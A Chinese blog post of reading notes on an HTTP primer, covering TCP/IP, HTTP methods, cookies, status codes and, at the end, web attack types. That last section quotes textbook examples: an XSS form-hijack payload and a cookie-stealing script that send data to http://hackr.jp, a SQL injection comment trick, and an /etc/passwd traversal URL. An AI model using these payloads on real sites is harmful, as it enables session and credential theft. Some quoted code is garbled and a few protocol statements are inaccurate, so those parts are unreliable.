---
layout: "../../layouts/BlogPost.astro"
title: "图解http"
titlePre: [笔记]
description: "笔记里面没有图"
pubDate: "2021/07/08"
heroImage: ""
tag: 
   - 笔记
   - 前端
---
### 网络基础TCP/IP
TCP/IP协议族里最重要的一点是分层。：应用层、传输层、网络层和数据链路层。  
· 应用层决定了向用户提供应用服务时通信的活动。 ·  传输层对上层应用层，提供处于网络连接中的两台计算机之间的数据串数。 ·  网络层用来处理在网络上流动的数据包。 ·  链路层(又名数据链路层、网络接口层)用来处理网络连接的硬件部分。  
#### TCP/IP通信传输流
HTTP举例，首先作为发送端的客户端在应用层(HTTP协议)发出一个想看某个Web页面的HTTP请求。
接着 为了传输方便，在传输层(TCP协议)把从应用层处收到的数据（HTTP协议）把从应用层处收到的数据（HTTP请求报文）进行分割，并在各个报文上打上标记序号及端口号后转发给网络层。  
在网络层（IP协议），增加作为通信目的地的MAC地址后转发给链路层。  
接收端的服务器在链路层接收到的数据按序往上层发送知道应用层。  
### 与HTTP关系密切的协议：IP、TCP和DNS
IP协议的作用是把各种数据包传送给对方。保证确实传送两个重要条件是IP地址和MAC地址。 IP地址指明了节点被分配到的地址，MAC地址是指网卡所属的固定地址。    
ARP是一种用以解析地址的协议，根据通信方的IP地址就可以反查出对应的MAC地址。  
无论哪台计算机、哪台网络设备，他们都无法全面掌握互联网中的细节。  
TCP位于传输层，提供可靠的字节流服务。 TCP协议为了更容易传送大数据才把数据分割，而且TCP协议能够确认数据最终是否送达到对方。  
TCP协议采用三次握手策略。 握手过程使用了TCP的标志--SYN和ACK。 
### 负责域名解析的DNS服务
DNS服务是和HTTP协议一样位于应用层的协议。它提供域名到IP地址之间的解析服务。  
  
### URI和URL
统一资源标识符 URI(Uniform Resource Identifier)。 URI是由某个协议方案表示的资源的定位标识符。   
URI用字符串标识某一互联网的资源，而URL表示资源的地点。URL是URI的子集。  
## 简单的HTTP协议
HTTP协议用于客户端和服务器端之间的通信，访问和提供文本或图像等资源。   
HTTP协议规定，请求从客户端发出，最后服务器端响应该请求并返回。  
请求报文是由请求方法、请求URI、协议版本、可选的请求首部字段和内容实体构成的。  
响应报文基本上由协议版本、状态码、用以解释状态码的原因短语、可选的响应首部字段以及实体主体构成。  
HTTP是一种不保存状态、即无状态协议。HTTP协议自身不对请求和响应之间的通信状态进行保存。在HTTP级别协议对于发送过的请求或响应都不做持久化处理。  
### 告知服务器意图的HTTP方法
GET：获取资源，用来请求访问已被URI识别的资源。指定的资源经服务器端解析后返回响应内容。  
POST：传输实体主体； PUT：传输文件； HEAD：获得报文首部，用于确认URI的有效性及资源更新的日期时间等； DELETE：删除文件，和PUT方法一样不带验证机制，当配合Web应用程序的验证机制或遵守REST标准时有可能开放使用； OPTIONS：询问支持的方法，用来查询针对请求URI指定的资源支持的方法； TRACE：追踪路径，让Web服务器端将之前的请求通信环回给客户端， TRACE方法本来就不怎么用又容易引发XST(跨站追踪)，通常不会用到了； CONNECT：要求用隧道协议连接代理，CONNECT方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行TCP通信。主要使用SSL和TLS协议把通信内容加密后经网络隧道传输。  
### 使用方法下达命令
向请求URI指定的资源发送请求报文时，采用称为方法的命令。  
### 持久连接节省通信量
持久连接的特点是，只要任意一端没有明确提出断开连接，则保持TCP连接状态。  
持久连接使得多数请求以管线化方式发送成为可能。 --不用等待响应亦可直接发送下一个请求。  
### 使用Cookie的状态管理
无状态协议可减少服务器CPU及内存资源消耗，因为HTTP协议本身非常简单才会被应用到各种场景。  
Cookie会根据从服务器端发送的响应报文内的一个叫做Set-Cookie的首部字段信息，通知客户端保存Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入Cookie值后发送出去。  
## HTTP报文内的HTTP信息
### HTTP报文
用于HTTP协议交互的信息被称为HTTP报文。 HTTP报文大致可分为报文首部和报文主体两块。  
### 请求报文及响应报文的结构
· 请求行 包括用于请求的方法，请求URI和HTTP版本。  · 状态行 包含表明响应结果的状态码，原因短语和HTTP版本。 · 首部字段 包含表示请求和响应的各种条件和属性的各类首部(一般4种，通用首部、请求首部、响应首部和实体首部)。 · 其它 可能包含HTTP的RFC里未定义的首部(Cookie等)。  
### 发送多种数据的多部份对象集合
MIME(多用途因特网邮件扩展)机制允许邮件处理文本、图片、视频等多个不同类型的数据。 HTTP协议中也采纳了多部份对象集合，发送的一份报文主体内可含有多类型实体。通常是在图片或文本文件等上传时使用。  
多部分对象集合包含的对象如下：  
· multipart/form-data 在Web表单文件上传时使用。 · multipart/byteranges  状态码206  
### 获取部分内容的范围请求
遇到网络中断时，需要一种恢复机制-指能从之前下载中断处恢复下载。要实现该功能需要指定下载的实体范围。像这样，指定范围发送的请求叫做范围请求。  
byte范围的指定形式 `Range: bytes=5001-10000` `Range: bytes=5001-` `Range: bytes=-3000, 5000-7000`  
### 内容协商返回最合适的内容
当浏览器的默认语言为英文或中文，访问相同URI的Web页面时，则会显式对应的英语版或中文版的Web页面。这样的机制成为内容协商。 内容协商机制是指客户端和服务器端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。  
内容协商协议有3种类型： 服务器驱动协商、客户端驱动协商、透明协商。  
## 返回结果的HTTP状态码
状态码的职责是当客户端向服务器端发送请求时，描述返回的请求结果。  
#### 2.xx成功
· 200 ok，表示从客户端发来的请求在服务器端被正常处理了。  · 204 No Content，代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，也不允许返回任何实体的主体。  · 206 Partial Content，表示客户端进行了范围请求，而服务器成功执行了这部分的GET请求。  
#### 3.xx重定向
· 301 Moved Permanently，永久性重定向。表示请求的资源已被分配了新的URI。  · 302 Found，临时重定向。希望用户（本次）能用新的URI访问。  · 303 See Other，表示由于请求对应的资源存在着另一个URI，应使用GET方法定向获取请求的资源。 · 304 Not Modified，表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但因发生请求未满足条件的情况后，直接返回304 Not Modified。  · 307 Temporary Redirect，临时重定向。  
#### 4.xx客户端错误
· 400 Bad Request，表示请求报文中存在语法错误。浏览器会像200ok一样对待该状态码。  · 401 Unauthorized，表示发送的请求需要有通过HTTP认证的认证信息。  · 403 Forbidden，表明对请求资源的访问被服务器拒绝了。 · 404 Not Found，服务器上无法找到请求的资源。  
#### 5.xx服务器错误
· 500 Internal Server Error，服务器端在执行请求时发生了错误。 · 503 Service Unavailable，服务器暂时超负载或正在停机维护，现在无法处理请求。  
## 与HTTP协作的Web服务器
代理，网关，隧道。
## HTTP首部
在请求中，HTTP报文由方法、URL、HTTP版本、HTTP首部字段等部分构成。  
## 确保Web安全的HTTPS
### HTTP+加密+认证+完整性保护=HTTPS
## Web的攻击技术
针对Web应用的攻击模式 · 主动攻击(SQL注入、OS命令注入)  · 被动攻击  · 以服务器为目标的主动攻击   
#### 跨站脚本攻击（XSS）
指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击。可能造成影响有  
· 利用虚假输入表单骗取用户个人信息  · 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。  · 显式伪造的文章或图片    
**跨站脚本攻击案例**  
`http://example.jp?login? ID="><script>var+f=document=>.getElementById("login"); +f.action="http://hackr.jp/pwget"; +f.method==>"get";</script><span+s="`  
**用户Cookie窃取攻击**  
```javascript
var content = escape(document.cookie)
document.write("<img src=http://hackr.jp/?")
document.write(content)
document.write(">")
```
#### SQL注入攻击
SQL注入是指针对Web应用使用的数据库，通过运行非法的SQL而产生的攻击。造成的影响有  
· 非法查看或篡改数据库内的数据  · 规避认证  · 执行和数据库服务器业务关联的程序等    
SQL语句示例 `SELECT title,text FROM nwesTbl WHERE id=123`  
攻击案例  
`SELECT * FROM bookTbl WHERE author = 'someone'--' and flag=1` SQL语句中--之后全视为注释。这样连那些尚未出版的图书也一并显式出来了  
#### OS命令注入攻击
指通过Web应用，执行非法的操作系统命令达到攻击的目的。Shell函数  
#### HTTP首部注入攻击
指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式。造成影响有  
· 设置任何Cookie信息  · 重定向至任意URL · 显式任意的主体  
#### 邮件首部注入攻击
#### 目录遍历攻击
对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。有时也称为路径遍历攻击。  
`http://example.com/read.php?log=../../etc/passwd`  
#### 远程文件包含漏洞
### 因会话管理疏忽引发的安全漏洞
#### 会话劫持
攻击者通过某种手段拿到了用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击的目的。  
#### 会话固定攻击
#### 跨站请求伪造（CSRF）
攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。影响有  
· 利用已通过认证的用户权限更新设定信息等  · 利用以通过认证的用户权限购买商品  · 利用已通过认证的用户权限在留言板发表言论   
